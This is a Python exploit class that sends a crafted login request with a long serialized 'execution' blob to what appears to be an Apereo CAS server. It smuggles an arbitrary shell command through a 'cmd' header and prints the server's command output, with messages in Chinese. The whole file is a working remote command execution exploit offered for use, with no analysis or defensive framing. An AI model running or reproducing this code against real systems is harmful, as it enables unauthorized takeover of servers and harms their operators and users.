import requests


class Exploit:
    def __init__(self, url, command):
        self.url = url
        self.command = command

    def attack(self):
        header = {
            "Content-Type": "application/x-www-form-urlencoded",
            "Referer": self.url,
            "cmd": self.command
        }
        data = "username=admin&password=admin&lt=LT-19-f7LKKLiArtiKoJPKzqyu4UcT5MkBve-cas01.example.org&execution=bcf8b8a4-1058-4bd5-9822-f26c688987d8_AAAAIgAAABD4PyHsk43Dansl%2FiB7zE1BAAAABmFlczEyOJM%2BwRmNnagLwThagrZcmfXuP4VLBLB8hulXvFW%2Bnzj%2BxYP%2Bu2f5EXEndd9TL0EUI5rpcZVUhWeqtY12lZHr2bTC19IJ%2ByMcj1krAHfsgp9%2FE5VLXiWtNPANImyJJWCNmU%2Bzpi9nEbyVf%2F9YCUxxYswGBtFw%2B4GK4EgsEQAr28nzSOA6itwLDooOy5yWXf3aczHj6hvW3pywh6URAulexehM%2F38qMysWd0EvQ%2BVM%2FShVjF4Fw2zFJ41HfMjtaX4KWocQTyPxlD7GM%2BGpQCaNZ6yoE5YHrIvs0omEZi0ErEvgLGiun5m1P21vpcmjV7mvStfk703p%2BXbAGussybNnae0iRui%2BnGhCKdI7MN8bZ0DSMY5JVpyJxxLvn%2FNaBhmjppUZiqGabYUppQQ9ZTWtWqkOfigNtZc2yn6XXyrebhXTxIKs0A%2BmVWr3EouNM2fR04MdaqTM21s%2BowJ485Cro9OplCztyV2%2FIdWh388FvNWKSTJ5VsSLJ8cGGe0hkNm0pZrUo8Pm5ukgO%2Fw%2BjhanlOAN8v8VRUkaXZ7KdG%2BFg%2FAPZcheTCZ920nDcWzInEQkHA%2B2Z4Y8IGVxIeR7HKKvQlWRQdQzRdRzSAu5LfNmX6FK7jp6zxc2Co4JO2M45S2yvkFoNP3kT8lR2gjYfepTTEdyHQ%2FgtxXqg79hy5O0vvol95UzHKb6reiv5GbFF%2BsQ5TAHg0Il44RumgW756tD0NlhzaDJkYDxux43QC%2BNzo8gnuP4fMU5MLPrbteILlIlhWjr93Fob%2F2IiuP8mFYOD6GBN6u%2BUCyCKgkqq8NzXTk5wgU5c8LcXwKD%2Ba2VzyGRHCD6b9UJNKzZl57pAeLRNuszqngpMaCCtU5d8D8%2BUTQc7ntKVdzaQIwEUX2GMblUjMeMThcIfFUW9mcmuYwv5GBH%2FT1pB6ylTa1Xu%2B39LxKzz5QM8a%2BxPxUzp4LLZk9Dxx8YIdzFK%2Fy4osydW96Fa2%2F1YfYW4jan0yeBr6KY7TIf8RDJkuCUF8kl9OYq5e%2FYLLyhghLCo8T2%2FFMFIgjqA6OiNwl4wE2%2BRgRwyhCBPDRUY0bkytwfI67c1XP8K66bBCG6QTYIpD%2BBDgB7ADvfP0ggu9b4XqWDrlbvM8ZzeUjzUPeab5WqV7HuLIiRik6Kf18WUV1PK9774Flqei6YcDLB7dyY%2BufQ7zHbHBzBsfc5DF9lJ0Gj4iAUKwDO6Nx%2F99QCCLdnikfuoFb70C7ASu6U3i%2BCPILx7lkrolEbNBIp5BVYm8WES%2FdcBL6Ac4%2BaEnuMYJ2d%2FTXkdwuwqL%2Fhny5TC81HllZ2AzKlpjw93SCLZE78mO9Llx%2FtyO5Twm6ZrY0MfReCMDigSt16eFn%2B%2BfxfAogdoVtaP95nS67mQUS20%2BdDUEM0ho1pfFRKQZ%2F0iEYjEWBkBLGIvrlc66rUjnqdz66tq57lcYK3etgUxujQCDHSdtOGVkDRQ%2BLx2hIIQq7Krp%2FfMTZuuK62fbKOzQBZ51JPibYn5fEiNB9934YuvSocb85iJca8bfo7A1K2ljV1wxXHIFp7nXTFJsF1Fp8nglSn4Dn4m7TfCgu8bpDvw%2BM%2B2%2BvKTQGusOMkVScI1cTURuCiZpvenS2BuAicx6dzAl0td6IUXSa8fmlVwUr%2B7c1Za3o6vlpybQMFwWWdEyvwEDvOywmDprkdQ7vJWQunkdrinuTgXkOtF6yHHFqf2TvdK6n1x4Yb92sct6Mec1l47WQuTXQyinhU51AfcehBp0gYjXxgN2yFbkirqQ3HShvosi56556bSGAXly9NdKVCbOyQBRNwzRMb9LsU%2BHVr7Gvb3hZUy9F4HWREcREaBFpqc1L0NnjgPAm0%2FIdD2oYxFVeSxGJNuwW5OZFCXOwq0z0MjPT8u3Wy1jGZQjs74XdwssJUvDiMD6cDGKeQYe647b1vqWuKYlcCk79KXd4ZkV5B7iB4HY%2Fo8i4RJh2nvr897%2BesqMEhDah6p23H9ioE8cwH09t1o%2BD%2FXn%2B9Ibl6YvMueJTXGEHFg1yPYEZlgM6JkW9bx7LkGmJElmJWfi53Ym3KkRf44WeP%2BMMAXrhWmmf3vwWEIngWQr8rTxteF7pQI%2FP%2BCb3NozrdLoe8dsljHxoebpSaiYEBs1jISjeglZwu9U602NFWk7R56fR3OvCqFa5P9PrdLXDC7wMOgWQSrdrBj9%2BdgcCGVUfEDiyslIaF04V9Zk5hLTlFnQv1%2BqZGbteoClaEHu5upGkrFVJcDtl%2B1gOiCjXgUnr1DyFtchEPb3iXLCJaUFYCSt6zPUXh4gnnl2qpVEW4xWyD3CyqXn3kKfMZPG2Rns46vvxZD4cHAci5nXzjAYDi5ra9c7DWhMs4SYOjNQS99pqHPekpC7G1gGUkvnSC0XdLRx8gGblsGTRAIs7JKWPhll0Yv6NhKHG4kQU9P5IdtvCAphUcUircvYnYFDXRln46%2F9yA7UjyxIC6dFVne70wDJqL2OOK0bPvJ%2F9GW22niCbVsSW8ooaHVHRRoSow9C1X%2BBODBIQ87PVwkUzu%2FqtPFchO3gP3FlVdYLiNBSdlFJpbem9Ofmd1KSYBeC%2BBYLu1Db3mrIRL%2Fl9PyYOWX6Kme0I6O%2BjDtWSzCiNacvEaDRbI%2Be7m1mJO7Q2wy7Hu46EDdCyGOW0UwLSdCPcT5S7gdJQclsi%2Bilez5tj4vQbhHxiH6Heqbk2VOFQ73mO1rZozhN5sY3bd5BdtuEABScXZgD88xg%2BEpjjsQw1qV2V8uosWfJCnWgDF%2BsRH7oEwM2qVs2k%3D&_eventId=submit&submit=LOGIN"
        try:
            response = requests.post(self.url, headers=header, data=data)
            if response.status_code == 200:
                return "当前命令\t{}\t 执行结果:\n{}".format(self.command, response.text)
            else:
                return "当前命令\t{}\t执行失败".format(self.command)
        except Exception as e:
            print(e)
